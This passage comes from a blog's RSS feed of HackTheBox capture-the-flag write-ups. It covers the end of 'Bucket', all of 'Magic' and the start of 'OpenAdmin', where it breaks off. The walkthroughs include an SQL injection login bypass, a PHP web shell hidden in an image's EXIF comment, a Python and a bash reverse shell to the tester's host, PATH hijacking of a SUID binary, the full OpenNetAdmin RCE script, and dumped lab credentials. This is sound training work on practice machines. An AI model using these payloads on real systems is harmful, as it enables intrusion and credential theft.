</code></pre></div><p>On <code>roy</code> shell, I can see it captured the ssh key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app/files$ <span style="color:#66d9ef">while</span> sleep 1; <span style="color:#66d9ef">do</span> sed -n <span style="color:#e6db74">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null; <span style="color:#66d9ef">done</span>

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...&lt;SNIP&gt;...
-----END OPENSSH PRIVATE KEY-----
</code></pre></div><p>The full process as shown below:</p>
<p><div class="img-container"><img src="imgs/image-20210425032310617.png" alt="image-20210425032310617"  /></div>
</p>
<p>I’ll save that key as <code>root_rsa</code> and change its permission to 600.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ chmod <span style="color:#ae81ff">600</span> root_rsa
</code></pre></div><p>After that, I can just login as root user using the SSH key I obtained.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «bucket» «10.10.14.39» 
$ ssh -i root_rsa 10.10.10.212
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

...&lt;SNIP&gt;...
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:df48

...&lt;SNIP&gt;...
root@bucket:~# id;hostname;cut -c-15 root.txt 
uid=0(root) gid=0(root) groups=0(root)
bucket
efc73dd09ceb705
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3">https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3</a></li>
<li><a href="https://pd4ml.com/html.htm">https://pd4ml.com/html.htm</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Magic</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-magic/</link>
      <pubDate>Fri, 09 Apr 2021 13:32:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-magic/</guid>
      <description>Magic is a medium difficulty Linux machine from HackTheBox that features a php-based web application which is vulnerable to SQL injection for login bypass. The application upload feature has an upload filter that can be bypassed by embedding a web shell payload to a valid image file and adding a php extension to it. With that web shell, I&amp;rsquo;m able to gain a foothold on the system and use database credentials to dump admin password that is reused by a user on the box.</description>
      <content:encoded><![CDATA[<p>Magic is a medium difficulty Linux machine from HackTheBox that features a php-based web application which is vulnerable to SQL injection for login bypass. The application upload feature has an upload filter that can be bypassed by embedding a web shell payload to a valid image file and adding a php extension to it. With that web shell, I&rsquo;m able to gain a foothold on the system and use database credentials to dump admin password that is reused by a user on the box. For the root part, there&rsquo;s a SUID binary that calls other binaries without their absolute path. This allows me to perform a path hijack attack and gain root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>SQL injection</li>
<li>Bypassing Upload Filter</li>
<li>SUID exploitation</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «magic» «10.10.14.169»
$ nmap -sC -sV -oA scans/magic 10.10.10.185

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey:
|   <span style="color:#ae81ff">2048</span> 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p><code>nmap</code> found two ports open, an HTTP service on port 80 and SSH service on port 22</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80  -  Website</h3>
<p>The home page shows a bunch of images.</p>
<p><img src="imgs/image-20210413132328926.png" alt="image-20210413132328926" style="zoom:80%;" /></p>
<p>By clicking &ldquo;Views image&rdquo;, I know some images located on <code>/images/uploads</code> and some others on <code>/images/fulls</code>. At the bottom page, there&rsquo;s a login button that points to <code>/login.php</code></p>
<p><img src="imgs/image-20210412052815532.png" alt="image-20210412052815532" style="zoom: 80%;" /></p>
<p>Common credentials don&rsquo;t seem to work here.</p>
<h4 id="sql-injection---login-bypass-on-loginphp">SQL injection - Login bypass on <code>/login.php</code></h4>
<blockquote>
<p>The login form doesn&rsquo;t allows spacing between character, but it can be tricked by copy and paste.</p>
</blockquote>
<p>A basic sql injection technique <code>' or 1 = 1 -- - </code>  to bypass login is work against the login page.</p>
<blockquote>
<p>In MySQL, a space after a comment is a must <code>-- [space]</code>, because of that I added <code>-- -</code> to make it clear.</p>
</blockquote>
<p>We can assume the back-end query would look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">...<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">some</span> php<span style="color:#f92672">&gt;</span>...
<span style="color:#960050;background-color:#1e0010">$</span>username <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>_POST[<span style="color:#e6db74">&#39;user&#39;</span>]
<span style="color:#960050;background-color:#1e0010">$</span>pwd <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>_POST[<span style="color:#e6db74">&#39;password&#39;</span>]
...<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">some</span> php<span style="color:#f92672">&gt;</span>...

<span style="color:#66d9ef">SELECT</span> username, password <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">table</span>.<span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$username&#39;</span> <span style="color:#66d9ef">and</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$pwd&#39;</span>
</code></pre></div><p>If I assign <code>' or 1 = 1 -- - </code> as value of <code>$username</code>, it becomes:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> username, password <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">table</span>.<span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#75715e">-- -&#39; and password=&#39;$pwd&#39;
</span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="upload-filter-bypass">Upload filter bypass</h4>
<p>Upon a successful login, the site redirects me to <code>/upload.php</code>. It shows up with an upload form. It only accepts a valid image file.</p>
<p><img src="imgs/image-20210413153556151.png" alt="image-20210413153556151" style="zoom:80%;" /></p>
<p>After some testing, I can bypass this upload filter by embedding my php shell on an image file (I took it from the web itself). This can be done by using <code>exiftools</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.169»
$ ./exiftool -Comment<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
</code></pre></div><p>Next, I added <code>.php</code> extension right before the image extension (in my case it is <code>.jpg</code>, so it becomes <code>filename.php.jpg</code>).</p>
<p>Back to <code>/upload.php</code>, now it accepts my php embedded image.</p>
<p><img src="imgs/image-20210413153504323.png" alt="image-20210413153504323" style="zoom:80%;" /></p>
<p>I can find the uploaded file at <code>http://htb.magic/images/uploads/</code>.</p>
<p>When I visit <code>http://htb.magic/images/uploads/iamf.php.jpg?cmd=pwd</code>, I can see the code execution is working</p>
<p><img src="https://cdn-images-1.medium.com/max/1000/1*WJEvgyrM5UmXULt8uBhu3A.png" alt="img" style="zoom:80%;" /></p>
<h4 id="shell-access">Shell access</h4>
<p>The machine has Python3 installed. With that, I can send a Python one liner reverse shell and set up a listener on port 443 to gain a foothold on the system.</p>
<p>I&rsquo;ll enter this URL on the browser.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">http://htb.magic/images/uploads/iamf.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.169%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27&#34;
</span></code></pre></div><p>Now on my listener, it caught the shell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «magic» «10.10.14.169»
$ nc -nvlp <span style="color:#ae81ff">443</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.169<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.185<span style="color:#f92672">]</span> <span style="color:#ae81ff">19448</span>
bash: cannot set terminal process group <span style="color:#f92672">(</span>1327<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
$ id
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-theseus">Shell as theseus</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>I discovered a database configuration <code>db.php5</code> that stores credentials after enumerating the current working directory with the find command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ find . -type f -user www-data

...&lt;SNIP&gt;...
./var/www/Magic/db.php5
...&lt;SNIP&gt;...
</code></pre></div><p><img src="imgs/image-20210413153535228.png" alt="image-20210413153535228" style="zoom:80%;" /></p>
<h4 id="database-dump">Database dump</h4>
<p>I can use <code>netstat</code> to confirm that the MySQL server is currently running.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@ubuntu:/var/www/Magic$ netstat -tlpn

...&lt;SNIP&gt;...
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
...&lt;SNIP&gt;...
tcp		0		<span style="color:#ae81ff">0</span>   127.0.0.1:3306           0.0.0.0:*              LISTEN       -
...&lt;SNIP&gt;...
</code></pre></div><p>Unfortunately, <code>mysql</code> binary is not present in the box.</p>
<p><img src="imgs/image-20210413153425371.png" alt="image-20210413153425371" style="zoom:67%;" /></p>
<p>Instead, I could use <code>mysqldump</code> to dump the database.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@ubuntu:/var/www/Magic$ mysqldump Magic -u theseus -p<span style="color:#e6db74">&#39;iamkingtheseus&#39;</span>

...&lt;SNIP&gt;...
LOCK TABLES <span style="color:#e6db74">`</span>login<span style="color:#e6db74">`</span> WRITE;
/*!40000 ALTER TABLE <span style="color:#e6db74">`</span>login<span style="color:#e6db74">`</span> DISABLE KEYS */;
INSERT INTO <span style="color:#e6db74">`</span>login<span style="color:#e6db74">`</span> VALUES <span style="color:#f92672">(</span>1,<span style="color:#e6db74">&#39;admin&#39;</span>,<span style="color:#e6db74">&#39;Th3s3usW4sK1ng&#39;</span><span style="color:#f92672">)</span>;
/*!40000 ALTER TABLE <span style="color:#e6db74">`</span>login<span style="color:#e6db74">`</span> ENABLE KEYS */;
UNLOCK TABLES;                                           
/*!40103 SET TIME_ZONE<span style="color:#f92672">=</span>@OLD_TIME_ZONE */;
...&lt;SNIP&gt;...
</code></pre></div><h4 id="shell-upgrade-to-ssh">Shell upgrade to SSH</h4>
<p>The password is reused by user <code>theseus</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
theseus@ubuntu:/var/www/Magic$
</code></pre></div><p>Before enumeration, I would like to switch to SSH. First, I&rsquo;ll generate a new ssh key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «magic» «10.10.14.169»
$ ssh-keygen -f theseus 
</code></pre></div><p>Then, I&rsquo;ll add the newly generated public key to <code>theseus</code>&rsquo;s <code>authorized_keys</code>.</p>
<pre><code>theseus@ubuntu:~/.ssh$ echo 'ssh-rsa AAABBBCCCDDD' &gt;&gt; authorized_keys
</code></pre><p>Now I can log in via SSH.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «magic» «10.10.14.169»
$ ssh -i  theseus@10.10.10.185
...&lt;SNIP&gt;...
theseus@ubuntu:~$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>,1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span>
</code></pre></div><h2 id="shell-as-root">Shell as root</h2>
<h4 id="enumeration-2">Enumeration</h4>
<p>Upon enumerating for SUID, there&rsquo;s a binary that doesn&rsquo;t seem a common SUID on Ubuntu.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:~$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
</code></pre></div><p><img src="imgs/image-20210413153352652.png" alt="image-20210413153352652" style="zoom: 67%;" /></p>
<p>The <code>sysinfo</code> binary is owned by root, but it can be executed by the <code>users</code> group and  <code>theseus</code> is a member of that group.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:~$ ls -las /bin | grep sysinfo
 <span style="color:#ae81ff">24</span> -rwsr-x--- <span style="color:#ae81ff">1</span> root users <span style="color:#ae81ff">22040</span> Oct <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">2019</span> sysinfo
</code></pre></div><p>I executed the binary and it returns some hardware information on screen that looks similar to <code>lshw</code>, <code>free</code> and other binary related to hardware info. A quick search on Google shows this:</p>
<p><img src="imgs/image-20210413153328164.png" alt="image-20210413153328164" style="zoom:80%;" /></p>
<p>It is the same header.</p>
<p><img src="imgs/image-20210413153311827.png" alt="image-20210413153311827" style="zoom:80%;" /></p>
<p>Running <code>strings</code> against <code>sysinfo</code> reveals it calls <code>lshw</code>, <code>free</code>, <code>fdisk</code> and some other bins without their absolute path. (I don&rsquo;t have the screenshots to show what it looks like, also can&rsquo;t find the logs on my notes, sorry)</p>
<ul>
<li>Absolute path: <code>/bin/sysinfo</code> &ndash;&gt; fixed path, can not be modified except global write access is permitted. (cmiiw)</li>
<li>Relative path: <code>sysinfo</code> &ndash;&gt; resolved by user&rsquo;s env, can be modified</li>
</ul>
<h4 id="path-hijacking-on-suid">Path Hijacking on SUID</h4>
<p>Knowing the SUID binary uses relative path to call other binaries, I could abuse this by creating, for example, a fake <code>lshw</code> binary that contains a reverse shell.</p>
<p>First, I’ll create a fake <code>lshw</code> in <code>/tmp/iamf</code> folder and add append one liner bash reverse shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp$ mkdir iamf
theseus@ubuntu:/tmp$
theseus@ubuntu:/tmp$ which lshw
/bin/lshw
</code></pre></div><p>Next, I’ll export <code>/tmp/iamf</code> to environment variable <code>$PATH</code>. Now If I call <code>lshw</code>, the OS will resolve it to the one on <code>/tmp/iamf</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp$ echo -e <span style="color:#e6db74">&#39;#!/bin/sh bash -i &gt;&amp; /dev/tcp/10.10.10.169/1234 0&gt;&amp;1&#39;</span> &gt; iamf/lshw
theseus@ubuntu:/tmp$
theseus@ubuntu:/tmp$ export PATH<span style="color:#f92672">=</span>/tmp/iamf:$PATH
theseus@ubuntu:/tmp$
theseus@ubuntu:/tmp$ which lshw
/tmp/iamf/lshw
</code></pre></div><p>After that, I can just execute the <code>sysinfo</code> binary.</p>
<p>However, it then just hangs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp$ sysinfo
<span style="color:#f92672">====================</span>Hardware Info<span style="color:#f92672">====================</span>
</code></pre></div><p>That is because it was pwned on my listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «magic» «10.10.14.169»
$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.169] from (UNKNOWN) [10.10.10.185] 36094
root@ubuntu:/tmp/iamf# id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
</code></pre></div><center>
<p><div class="img-container"><img src="imgs/image-20210413152136238.png" alt="image-20210413152136238"  /></div>
</p>
</center>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://portswigger.net/support/using-sql-injection-to-bypass-authentication">https://portswigger.net/support/using-sql-injection-to-bypass-authentication</a></li>
<li><a href="https://exiftool.org/">https://exiftool.org/</a></li>
<li><a href="https://github.com/xapax/security/blob/master/bypass_image_upload.md">https://github.com/xapax/security/blob/master/bypass_image_upload.md</a></li>
<li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - OpenAdmin</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-openadmin/</link>
      <pubDate>Fri, 02 Apr 2021 04:25:51 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-openadmin/</guid>
      <description>Exploiting OpenNetAdmin vulnerability and sudo nano</description>
      <content:encoded><![CDATA[<p>OpenAdmin is an easy difficulty machine from HackTheBox that starts off by finding an instance of OpenNetAdmin. This application is known to be vulnerable to a remote code execution, which then can be leveraged to gain a foothold on the system. Enumeration inside the box finds a database credentials and it is reused by one of the users. The first user has access to web resources that are currently hosted internally. The internal web has a logic flaw that allows me to obtain the SSH key of the second user. The second user is allowed to run a <code>nano</code> editor with sudo privileges, and this can be abused to gain root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>OpenNetAdmin 18.1.1 exploitation</li>
<li>Exploiting sudo privileges on nano</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Dirb - Preinstalled in Kali Linux</li>
<li>John The Ripper - <a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ nmap -sV -sC -oA OpenAdmin <span style="color:#e6db74">&#39;10.10.10.171&#39;</span> -v
</code></pre></div><ul>
<li><code>-sC</code>, to scan with default script</li>
<li><code>-sV</code>, to scan service version</li>
<li><code>-oA</code>, to save the output to all formats</li>
<li><code>-v</code>, verbose mode</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>From the scan results, <code>nmap</code> found two open ports:</p>
<ul>
<li>An SSH service running on port 22</li>
<li>An HTTP service running on port 80</li>
</ul>
<p>Also, from the scan above, the machine is likely running Ubuntu.</p>
<p>As SSH usually requires valid credentials and there&rsquo;s is no straight exploit yet, hence further enumeration is needed.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP  80 - Website</h3>
<p>Visiting the standard http port only displays the Apache default page.</p>
<p><div class="img-container"><img src="imgs/4fb96d89a99c4244bb54291abd974267.png" alt="1ad0727e5956f0800cbe4ec0c02df451.png"  /></div>
</p>
<h4 id="directory-brute-force---dirb">Directory Brute Force - dirb</h4>
<p>Running  <code>dirb</code>  against the web successfully discovered a few hidden paths.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ dirb http://10.10.10.171/ /usr/share/wordlists/dirb/common.txt -r
...&lt;SNIP&gt;...
---- Scanning URL: http://10.10.10.171/ ----
<span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.10.171/artwork/
+ http://10.10.10.171/index.html<span style="color:#f92672">(</span>CODE:200|SIZE:10918<span style="color:#f92672">)</span> 
<span style="color:#f92672">==</span>&gt; DIRECTORY: http:/10.10.10.171/music/
+ http://10.10.10.171/server-status <span style="color:#f92672">(</span>CODE:200|SIZE:278<span style="color:#f92672">)</span>
...&lt;SNIP&gt;...
</code></pre></div><h4 id="artwork">/artwork/</h4>
<p>Nothing here.</p>
<p><div class="img-container"><img src="imgs/image-20210402000812490.png" alt="image-20210402000812490"  /></div>
</p>
<h4 id="music">/music/</h4>
<p>The <code>/music</code> home page provides a login menu that points to <code>http://openadmin.htb/ona</code></p>
<p><div class="img-container"><img src="imgs/image-20210402000847660.png" alt="image-20210402000847660"  /></div>
</p>
<h4 id="ona">/ona/</h4>
<p>Visiting <code>/ona/</code> brings me to an instance of OpenNetAdmin. It is a software for managing network related things.</p>
<p><div class="img-container"><img src="imgs/88b4ba1460574b0f88a4acd81e00d392.png" alt="f0df4d83acc69be1e666eb6e40a73494.png"  /></div>
</p>
<p>There&rsquo;s a warning on the page. It’s complaining about not running the latest version compared to the one currently in use (<code>v18.1.1</code>)</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="exploit-poc-for-opennetadmin-1811">Exploit PoC for OpenNetAdmin 18.1.1</h4>
<p>Based on the version above, a quick search on <code>exploit-db</code> shows that the current instance of OpenNetAdmin is vulnerable to a remote code execution. The exploit PoC source code is as follows:</p>
<blockquote>
<p>PoC: <a href="https://www.exploit-db.com/exploits/47691">https://www.exploit-db.com/exploits/47691</a></p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">while</span> true;<span style="color:#66d9ef">do</span>
 echo -n <span style="color:#e6db74">&#34;</span>$<span style="color:#e6db74"> &#34;</span>; read cmd
 curl --silent -d <span style="color:#e6db74">&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&#34;BEGIN\&#34;;</span><span style="color:#e6db74">${</span>cmd<span style="color:#e6db74">}</span><span style="color:#e6db74">;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>URL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> | sed -n -e <span style="color:#e6db74">&#39;/BEGIN/,/END/ p&#39;</span> | tail -n +2 | head -n -1
<span style="color:#66d9ef">done</span>
</code></pre></div><p>I saved the exploit to a file called <code>OpenRCE.sh</code>, and below is the issued command to run the exploit.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ ./OpenRCE.sh http://openadmin.htb/ona/
</code></pre></div><p><div class="img-container"><img src="imgs/2371e9e41f8449479f1bd8f24e8af888.png" alt="db477cc560e79f4bf705987c3188ee25.png"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-jimmy">Shell as jimmy</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Upon enumerating the current working directory, a database credential is found in <code>./local/config/database_settings.inc.php</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat ./local/config/database_settings.inc.php
&lt;?php

$ona_contexts<span style="color:#f92672">=</span>array <span style="color:#f92672">(</span>
  <span style="color:#e6db74">&#39;DEFAULT&#39;</span> <span style="color:#f92672">=</span>&gt; 
  array <span style="color:#f92672">(</span>
    <span style="color:#e6db74">&#39;databases&#39;</span> <span style="color:#f92672">=</span>&gt; 
    array <span style="color:#f92672">(</span>
      0 <span style="color:#f92672">=</span>&gt; 
      array <span style="color:#f92672">(</span>
        <span style="color:#e6db74">&#39;db_type&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;mysqli&#39;</span>,
        <span style="color:#e6db74">&#39;db_host&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;localhost&#39;</span>,
        <span style="color:#e6db74">&#39;db_login&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;ona_sys&#39;</span>,
        <span style="color:#e6db74">&#39;db_passwd&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;n1nj4W4rri0R!&#39;</span>,
